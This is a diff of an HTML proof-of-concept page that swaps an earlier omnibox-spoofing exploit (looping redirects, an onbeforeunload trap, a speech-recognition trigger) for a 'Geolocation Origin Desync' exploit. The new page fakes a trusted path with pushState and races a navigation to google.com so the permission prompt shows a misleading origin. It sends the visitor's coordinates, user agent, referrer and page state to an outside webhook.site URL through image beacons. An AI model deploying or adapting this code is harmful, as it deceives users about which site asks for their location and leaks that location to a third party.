@@ -1,27 +1,181 @@
-
-<!DOCTYPE HTML>
-<html lang="en-US">
+<!doctype html>
+<html>
 <head>
-	<meta charset="UTF-8">
-	<input id="foo" type="button" value="Click here" onclick="setInterval(function(){document.location='https://mixed.badssl.com'}, 1)">
-	<title>Omnibox spoofing</title>
-	<script>
-		var x = document.getElementById('foo');
-		window.onbeforeunload = function() {
-			setInterval(function() {
-				document.location='https://mixed.badssl.com'
-var recognition = new webkitSpeechRecognition();
-		recognition.onstart = function(){document.location='https://mixed.badssl.com'}		
-  recognition.start();
-			}, 0);
-		}
-	</script>
+<meta charset="utf-8">
+<title>Geolocation Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+}
+button {
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+#panel {
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
+}
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+}
+</style>
 </head>
 
 <body>
-	<center>
-		<br>
-	</center>
-</body>
 
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Request Location</h2>
+  <p>Tap the button below to request Geolocation permission.</p>
+
+  <button onclick="getLocation()">Get Location</button>
+  <p id="output">Location: -</p>
+
+  <div class="notice">
+    Demo only — observe origin shown in permission dialog
+  </div>
+</div>
+
+<script>
+const LOG_ENDPOINT = "https://webhook.site/562f0b30-3949-45c2-b3b0-0ac6de5470da";
+
+/* 🔥 CORS-proof forensic logger */
+function logEvent(type, extra = {}) {
+  const data = {
+    type,
+    ts: performance.now().toFixed(3),
+    epoch: Date.now(),
+    url: location.href,
+    origin: location.origin,
+    visibility: document.visibilityState,
+    readyState: document.readyState,
+    ...extra
+  };
+  const params = new URLSearchParams(data).toString();
+  new Image().src = `${LOG_ENDPOINT}?${params}`;
+}
+
+/* 🔥 Log global state */
+function logState(tag) {
+  logEvent(tag, {
+    hasFocus: document.hasFocus(),
+    visibility: document.visibilityState,
+    fullscreen: !!document.fullscreenElement,
+    referrer: document.referrer,
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    lang: navigator.language
+  });
+}
+
+/* UI elements */
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
+
+/* Get geolocation with enhanced logging */
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  logState("before_geolocation_request");
+  logEvent("geolocation_requested");
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      logEvent("geolocation_success", {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        timestamp: pos.timestamp
+      });
+      output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+    },
+    err => {
+      logEvent("geolocation_error", { code: err.code, message: err.message });
+      output.textContent = 'Permission denied';
+    }
+  );
+}
+
+/* Step 1: URL manipulation */
+trigger.onclick = () => {
+  logEvent("poc_started");
+  history.pushState({}, '', '/trusted');
+  logEvent("pushstate_done", { newPath: location.pathname });
+  panel.style.display = 'block';
+};
+
+/* Step 2: Navigation race with multi-delay logging */
+function triggerRace() {
+  [10, 30, 50, 80, 120].forEach(ms => {
+    setTimeout(() => {
+      logEvent("race_tick", { delay: ms, url: location.href });
+    }, ms);
+  });
+}
+
+window.addEventListener('pageshow', () => {
+  logEvent("pageshow");
+  triggerRace();
+
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        logEvent("navigation_triggered", { target: "https://google.com:9090" });
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+
+/* Step 3: Track visibility & focus changes */
+document.addEventListener("visibilitychange", () => {
+  logEvent("visibility_change", { visibility: document.visibilityState });
+});
+window.addEventListener("focus", () => { logEvent("window_focus"); });
+window.addEventListener("blur", () => { logEvent("window_blur"); });
+
+/* Step 4: Track page lifecycle */
+["pagehide","beforeunload","freeze","resume"].forEach(ev => {
+  window.addEventListener(ev, () => {
+    logEvent("lifecycle_event", { event: ev });
+  });
+});
+
+/* Step 5: Snapshot permission states */
+if (navigator.permissions) {
+  ["geolocation","notifications"].forEach(p => {
+    try {
+      navigator.permissions.query({ name: p }).then(res => {
+        logEvent("permission_state", { permission: p, state: res.state });
+      });
+    } catch(e){}
+  });
+}
+
+/* Initial state log */
+logState("initial_state");
+
+</script>
+
+</body>
 </html>
